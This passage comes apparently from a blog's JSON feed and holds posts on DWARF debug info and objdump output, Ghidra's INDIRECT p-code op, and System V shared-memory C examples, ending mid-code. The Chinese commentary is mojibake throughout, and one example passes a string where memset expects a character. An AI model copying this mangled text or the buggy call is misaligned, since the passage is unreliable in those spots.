Abbrev Number: 19 (DW_TAG_variable)</span><br><span class=\"line\">   &lt;32a&gt;   DW_AT_name        : (indirect string, offset: 0xcc): my_local</span><br><span class=\"line\">   &lt;32e&gt;   DW_AT_decl_file   : 1</span><br><span class=\"line\">   &lt;32f&gt;   DW_AT_decl_line   : 6</span><br><span class=\"line\">   &lt;330&gt;   DW_AT_decl_column : 9</span><br><span class=\"line\">   &lt;331&gt;   DW_AT_type        : &lt;0x65&gt;</span><br><span class=\"line\">   &lt;335&gt;   DW_AT_location    : 2 byte block: 91 6c \t(DW_OP_fbreg: -20)</span><br><span class=\"line\">&lt;2&gt;&lt;338&gt;: Abbrev Number: 20 (DW_TAG_variable)</span><br><span class=\"line\">   &lt;339&gt;   DW_AT_name        : i</span><br><span class=\"line\">   &lt;33b&gt;   DW_AT_decl_file   : 1</span><br><span class=\"line\">   &lt;33c&gt;   DW_AT_decl_line   : 7</span><br><span class=\"line\">   &lt;33d&gt;   DW_AT_decl_column : 9</span><br><span class=\"line\">   &lt;33e&gt;   DW_AT_type        : &lt;0x65&gt;</span><br><span class=\"line\">   &lt;342&gt;   DW_AT_location    : 2 byte block: 91 68 \t(DW_OP_fbreg: -24)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;1&gt;&lt;65&gt;: Abbrev Number: 5 (DW_TAG_base_type)      &lt;- 65</span><br><span class=\"line\">   &lt;66&gt;   DW_AT_byte_size   : 4</span><br><span class=\"line\">   &lt;67&gt;   DW_AT_encoding    : 5\t(signed)</span><br><span class=\"line\">   &lt;68&gt;   DW_AT_name        : int</span><br></pre></td></tr></table></figure>\n<p>åœ¨ <code>DW_AT_location</code>  å¤„  <code>DW_OP_fbreg</code>  è®°å½•äº†ç›¸å¯¹æŸä¸ªç»™å®šçš„ stack frame çš„åç§» (è¯´æ˜¯å°±æ˜¯ rbp ç„¶å Â± ä¸€ç‚¹ offsetï¼Œä½†æ˜¯æˆ‘æ²¡æ‰¾åˆ°)</p>\n<blockquote>\n<p>The DW_OP_fbreg operation provides a signed LEB128 offset from the address specified by the location description in the DW_AT_frame_base attribute of the current function. (This is typically a â€œstack pointerâ€ register plus or minus some offset. On more sophisticated systems it might be a location list that adjusts the offset according to changes in the stack pointer as the PC changes.)</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000000000401136 &lt;do_stuff&gt;:</span><br><span class=\"line\">  401136:\tf3 0f 1e fa          \tendbr64 </span><br><span class=\"line\">  40113a:\t55                   \tpush   %rbp</span><br><span class=\"line\">  40113b:\t48 89 e5             \tmov    %rsp,%rbp</span><br><span class=\"line\">  40113e:\t48 83 ec 20          \tsub    $0x20,%rsp</span><br><span class=\"line\">  401142:\t89 7d ec             \tmov    %edi,-0x14(%rbp)</span><br><span class=\"line\">  401145:\t8b 45 ec             \tmov    -0x14(%rbp),%eax</span><br><span class=\"line\">  401148:\t83 c0 02             \tadd    $0x2,%eax</span><br><span class=\"line\">  40114b:\t89 45 fc             \tmov    %eax,-0x4(%rbp)</span><br><span class=\"line\">  40114e:\tc7 45 f8 00 00 00 00 \tmovl   $0x0,-0x8(%rbp)</span><br><span class=\"line\">  401155:\teb 1a                \tjmp    401171 &lt;do_stuff+0x3b&gt;</span><br><span class=\"line\">  401157:\t8b 45 f8             \tmov    -0x8(%rbp),%eax</span><br><span class=\"line\">  40115a:\t89 c6                \tmov    %eax,%esi</span><br><span class=\"line\">  40115c:\t48 8d 3d a1 0e 00 00 \tlea    0xea1(%rip),%rdi        # 402004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class=\"line\">  401163:\tb8 00 00 00 00       \tmov    $0x0,%eax</span><br><span class=\"line\">  401168:\te8 d3 fe ff ff       \tcallq  401040 &lt;printf@plt&gt;</span><br><span class=\"line\">  40116d:\t83 45 f8 01          \taddl   $0x1,-0x8(%rbp)</span><br><span class=\"line\">  401171:\t8b 45 f8             \tmov    -0x8(%rbp),%eax</span><br><span class=\"line\">  401174:\t3b 45 fc             \tcmp    -0x4(%rbp),%eax</span><br><span class=\"line\">  401177:\t7c de                \tjl     401157 &lt;do_stuff+0x21&gt;</span><br><span class=\"line\">  401179:\t90                   \tnop</span><br><span class=\"line\">  40117a:\t90                   \tnop</span><br><span class=\"line\">  40117b:\tc9                   \tleaveq </span><br><span class=\"line\">  40117c:\tc3                   \tretq  </span><br></pre></td></tr></table></figure>\n<p>c è¡Œæ•°ä¸æ±‡ç¼–çš„æ˜ å°„å…³ç³»é€šè¿‡ä»¥ä¸‹å¾—åˆ°</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">objdump --dwarf=decodedline ./traceproc2</span> </span><br><span class=\"line\"></span><br><span class=\"line\">./traceproc2:     file format elf64-x86-64</span><br><span class=\"line\"></span><br><span class=\"line\">Contents of the .debug_line section:</span><br><span class=\"line\"></span><br><span class=\"line\">CU: ./traceproc2.c:</span><br><span class=\"line\">File name                            Line number    Starting address    View    Stmt</span><br><span class=\"line\">traceproc2.c                                   5            0x401136               x</span><br><span class=\"line\">traceproc2.c                                   6            0x401145               x</span><br><span class=\"line\">traceproc2.c                                   9            0x40114e               x</span><br><span class=\"line\">\t(Â·Â·Â· Â·Â·Â· Â·Â·Â·)</span><br><span class=\"line\">traceproc2.c                                  18            0x401196               x</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "debugger"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/10/26/Ghidra-INDIRECT-explanation/",
            "url": "https://squirre17.github.io/2022/10/26/Ghidra-INDIRECT-explanation/",
            "title": "Ghidra-INDIRECT-explanation",
            "date_published": "2022-10-26T10:05:02.000Z",
            "content_html": "<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">undefined4 <span class=\"title function_\">FUN_000114b8</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  undefined4 in_r3;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s(%d)\\n&quot;</span>,<span class=\"string\">&quot;part_data_end&quot;</span>,<span class=\"number\">0x7d</span>,in_r3,in_r3);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>output result as following (pcode-refined)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(ram, 0x114d4, 4) INDIRECT (ram, 0x114d4, 4) , (const, 0x15, 4)</span><br><span class=\"line\">(ram, 0x114d8, 4) INDIRECT (ram, 0x114d8, 4) , (const, 0x15, 4)</span><br><span class=\"line\"> ---  CALL (ram, 0x10ba4, 8) , (ram, 0x114d8, 4) , (ram, 0x114d4, 4) , (const, 0x7d, 4) , (register, 0x2c, 4) , (register, 0x2c, 4)</span><br><span class=\"line\"></span><br><span class=\"line\">(register, 0x20, 4) COPY (const, 0x0, 4)</span><br><span class=\"line\">(ram, 0x114d4, 4) COPY (ram, 0x114d4, 4)</span><br><span class=\"line\">(ram, 0x114d8, 4) COPY (ram, 0x114d8, 4)</span><br><span class=\"line\"></span><br><span class=\"line\"> ---  RETURN (const, 0x0, 4) , (register, 0x20, 4)</span><br></pre></td></tr></table></figure>\n<p>M4rsuriâ€™s explanation(<a href=\"https://github.com/NationalSecurityAgency/ghidra/issues/2744\">INDIRECT pcode op, input1 misunderstood Â· Issue #2744 Â· NationalSecurityAgency/ghidra Â· GitHub</a>)</p>\n<pre><code>I think that INDIRECT just indicates the varnode in output can be affected by the pcode indicated by it's input1.So it's impossible for a varnode to be affected when it's both not the output of an instruction and it's not associated with the instruction through an INDIRECT.\nIn other words, the varnodes being the output of all INDIRECTs associated with an instruction is the over-approximation of all varnodes that may be affected by the execution of this instruction. Only CALL/CALLIND instructions can have side affects because we need to take the execution of their corresponding subroutines into consideration. So INDIRECT instructions only appear before CALL/CALLIND instructions.\nI wonder if my understanding is proper.\nThank you.\n</code></pre>\n<p>INDIRECT pass input0 to output, but output be affected by some pcode indicated by input1 possibly.<br>\nAffect means â€œbe changedâ€ and so on in a narrow sense.<br>\nbecause we donâ€™t know what the subroutine indicated by subsequent CALL pcode that take out our parameterâ€™s address will do .Isnâ€™t it? Maybe it can modify the content in the corresponding address. So itâ€™s value is indirected when machine is executed to the next COPY pcode and pass it to other varnode.(so INDIRECT meaning - varnode passed through other subroutine before reaching its destination)<br>\n <code>A special address space indicates input1's use as an internal reference encoding</code>  simply means the Seqnum which indicates the sequence number of anyone pcode.</p>\n<p>if u print out above CALL pcodeâ€™s seqnum, u will find it exactly is  <code>0x15</code>  (const, 0x15, 4).</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(ram, <span class=\"number\">0x114c8</span>, <span class=\"number\">67</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">(ram, <span class=\"number\">0x114d4</span>, <span class=\"number\">4</span>) INDIRECT (ram, <span class=\"number\">0x114d4</span>, <span class=\"number\">4</span>) , (<span class=\"type\">const</span>, <span class=\"number\">0x15</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">(ram, <span class=\"number\">0x114c8</span>, <span class=\"number\">69</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">(ram, <span class=\"number\">0x114d8</span>, <span class=\"number\">4</span>) INDIRECT (ram, <span class=\"number\">0x114d8</span>, <span class=\"number\">4</span>) , (<span class=\"type\">const</span>, <span class=\"number\">0x15</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">(ram, <span class=\"number\">0x114c8</span>, <span class=\"number\">21</span>, <span class=\"number\">2</span>)                                             &lt;&lt;- <span class=\"number\">21</span> = <span class=\"number\">0x15</span></span><br><span class=\"line\"> ---  CALL (ram, <span class=\"number\">0x10ba4</span>, <span class=\"number\">8</span>) , (ram, <span class=\"number\">0x114d8</span>, <span class=\"number\">4</span>) , (ram, <span class=\"number\">0x114d4</span>, <span class=\"number\">4</span>) , (<span class=\"type\">const</span>, <span class=\"number\">0x7d</span>, <span class=\"number\">4</span>) , (<span class=\"keyword\">register</span>, <span class=\"number\">0x2c</span>, <span class=\"number\">4</span>) , (<span class=\"keyword\">register</span>, <span class=\"number\">0x2c</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">(ram, <span class=\"number\">0x114cc</span>, <span class=\"number\">29</span>, <span class=\"number\">3</span>) </span><br><span class=\"line\">(<span class=\"keyword\">register</span>, <span class=\"number\">0x20</span>, <span class=\"number\">4</span>) COPY (<span class=\"type\">const</span>, <span class=\"number\">0x0</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">(ram, <span class=\"number\">0x114d0</span>, <span class=\"number\">68</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">(ram, <span class=\"number\">0x114d4</span>, <span class=\"number\">4</span>) COPY (ram, <span class=\"number\">0x114d4</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">(ram, <span class=\"number\">0x114d0</span>, <span class=\"number\">70</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\">(ram, <span class=\"number\">0x114d8</span>, <span class=\"number\">4</span>) COPY (ram, <span class=\"number\">0x114d8</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">(ram, <span class=\"number\">0x114d0</span>, <span class=\"number\">44</span>, <span class=\"number\">6</span>)</span><br><span class=\"line\"> ---  RETURN (<span class=\"type\">const</span>, <span class=\"number\">0x0</span>, <span class=\"number\">4</span>) , (<span class=\"keyword\">register</span>, <span class=\"number\">0x20</span>, <span class=\"number\">4</span>)</span><br></pre></td></tr></table></figure>\n<p>Thanks M4tsuri for his help.</p>\n",
            "tags": [
                "Ghidra"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/10/18/shared-memory-and-semaphore-machenism/",
            "url": "https://squirre17.github.io/2022/10/18/shared-memory-and-semaphore-machenism/",
            "title": "shared-memory-and-semaphore-machenism",
            "date_published": "2022-10-18T06:57:37.000Z",
            "content_html": "<h1 id=\"åˆ†ç±»\"><a class=\"markdownIt-Anchor\" href=\"#åˆ†ç±»\">#</a> åˆ†ç±»</h1>\n<ul>\n<li>ç®¡é“</li>\n<li>æ¶ˆæ¯é˜Ÿåˆ—</li>\n<li>ä¿¡å·</li>\n<li>å…±äº«å†…å­˜</li>\n<li>ä¿¡å·é‡</li>\n<li>å¥—æ¥å­—</li>\n</ul>\n<h1 id=\"å…±äº«å†…å­˜\"><a class=\"markdownIt-Anchor\" href=\"#å…±äº«å†…å­˜\">#</a> å…±äº«å†…å­˜</h1>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">shmget</span><span class=\"params\">(<span class=\"type\">key_t</span> key, <span class=\"type\">size_t</span> size, <span class=\"type\">int</span> shmflg)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">shmat</span><span class=\"params\">(<span class=\"type\">int</span> shmid, <span class=\"type\">const</span> <span class=\"type\">void</span> *shmaddr, <span class=\"type\">int</span> shmflg)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">shmdt</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span> *shmaddr)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">shmctl</span><span class=\"params\">(<span class=\"type\">int</span> shmid, <span class=\"type\">int</span> cmd, <span class=\"keyword\">struct</span> shmid_ds *buf)</span>;</span><br></pre></td></tr></table></figure>\n<pre><code>   shmget()  returns  the identifier of the System V shared memory segment associated with the value of the argument key.  It may be used either to obtain the identifier of a previously created shared memory segment  (when shmflg is zero and key does not have the value IPC_PRIVATE), or to create a new set.\n</code></pre>\n<p>shmflg å’Œæ–‡ä»¶çš„æ§åˆ¶æƒé™ä¸€æ ·ã€‚<br>\næ³¨æ„åˆ°å¦‚æœ key æ˜¯ <code>IPC_PRIVATE</code> ï¼Œé‚£å°±ç›¸å½“äºåŒ¿å shmï¼Œåªèƒ½ç”¨äºæœ‰äº²å±å…³ç³»çš„è¿›ç¨‹é€šä¿¡ã€‚</p>\n<pre><code>   shmat()  attaches  the  System V shared memory segment identified by shmid to the address space of the calling process.  The attaching address is specified by shmaddr with one of the following criteria:\n</code></pre>\n<p>shmaddr ä¸€èˆ¬ä¸ºç©º è®©æ“ä½œç³»ç»Ÿå†³å®š</p>\n<pre><code>   shmdt() detaches the shared memory segment located at the address specified by shmaddr from the address  space of the calling process.\n\n   shmctl()  performs  the control operation specified by cmd on the System V shared memory segment whose identifier is given in shmid.\n</code></pre>\n<p>åˆ é™¤å…±äº«å†…å­˜ç”¨ <code>PC_RMID</code></p>\n<h2 id=\"å®æ“1\"><a class=\"markdownIt-Anchor\" href=\"#å®æ“1\">#</a> å®æ“ 1</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/ipc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/shm.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PATHNAME <span class=\"string\">&quot;.&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PROJ_ID 0x6666</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 0x1000</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> shmid;</span><br><span class=\"line\">    <span class=\"type\">key_t</span> key = ftok(PATHNAME, PROJ_ID);</span><br><span class=\"line\">    assert(key != <span class=\"number\">-1</span>);</span><br><span class=\"line\">    shmid = shmget(key, PAGE_SIZE, <span class=\"number\">0640</span>|IPC_CREAT);</span><br><span class=\"line\">    assert(shmid != <span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span> *shmptr = shmat(shmid, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(</span><br><span class=\"line\">        <span class=\"string\">&quot;shmptr is %p\\n&quot;</span></span><br><span class=\"line\">        <span class=\"string\">&quot;procid is %d\\n&quot;</span></span><br><span class=\"line\">        ,shmptr, getpid()</span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(shmptr, <span class=\"string\">&quot;A&quot;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">    getchar();</span><br><span class=\"line\">    shmdt(shmptr);</span><br><span class=\"line\">    <span class=\"type\">int</span> res = shmctl(shmid, IPC_RMID, <span class=\"number\">0</span>);</span><br><span class=\"line\">    assert(res != <span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>åˆ©ç”¨ä¸€ä¸ªå¯ä»¥è®¿é—®çš„ç›®å½•åˆ›å»º shmidï¼ˆproj å·å’Œå½“å‰ç›®å½•å¯ä»¥è¿”å›ä¸€ä¸ªå”¯ä¸€çš„ shmidï¼‰<br>\nåœ¨å½“å‰è·¯å¾„ä¸‹åˆ›å»ºä¸€æ¬¡å…±äº«å†…å­˜ ä¸åˆ é™¤çš„è¯å°±ä¸€ç›´å­˜åœ¨ã€‚</p>\n<p>ç”¨å‘½ä»¤</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipcs -m # æŸ¥çœ‹æ‰€æœ‰å…±äº«å†…å­˜</span><br><span class=\"line\">ipcrm -m &lt;shmid&gt; # åˆ é™¤ä¸€ä¸ªå…±äº«å†…å­˜</span><br></pre></td></tr></table></figure>\n<h2 id=\"å®æ“2\"><a class=\"markdownIt-Anchor\" href=\"#å®æ“2\">#</a> å®æ“ 2</h2>\n<p>server.c ç”¨æ¥åˆ›å»ºå…±äº«å†…å­˜</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/ipc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/shm.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PATHNAME <span class=\"string\">&quot;.&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PROJ_ID 0x6666</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 0x1000</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">key_t</span> key = ftok(PATHNAME, PROJ_ID);</span><br><span class=\"line\">    assert(key != <span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"type\">int</span> shmid;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((shmid = shmget(key, PAGE_SIZE, IPC_CREAT | IPC_EXCL | <span class=\"number\">0666</span>)) == <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;shmget&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> *shmptr = shmat(shmid, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i++ &lt; <span class=\"number\">26</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;client# %s\\n&quot;</span>,shmptr);</span><br><span class=\"line\">        sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    shmdt(shmptr);</span><br><span class=\"line\">    sleep(<span class=\"number\">2</span>);</span><br><span class=\"line\">    assert(shmctl(shmid,IPC_RMID,<span class=\"literal\">NULL</span>) != <span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>client.c ç”¨æ¥è¿ä¸Šå…±äº«å†…å­˜</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/ipc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;sys/shm.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PATHNAME <span class=\"string\">&quot;.&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PROJ_ID 0x6666</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 0x1000</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">key_t</span> key = ftok(PATHNAME,PROJ_ID);</span><br><span class=\"line\">    assert(key != <span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"type\">int</span> shmid = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((shmid = shmget(key, PAGE_SIZE, <span class=\"number\">0</span>)) == <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;shmget&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> *shmptr = shmat(shmid,<span class=\"literal\">NULL</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i &lt; <span class=\"number\">26</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        shmptr[i] = <span class=\"string\">&#x27;A&#x27;</span> + i;</span><br><span class=\"line\">        i++;</span><br><span 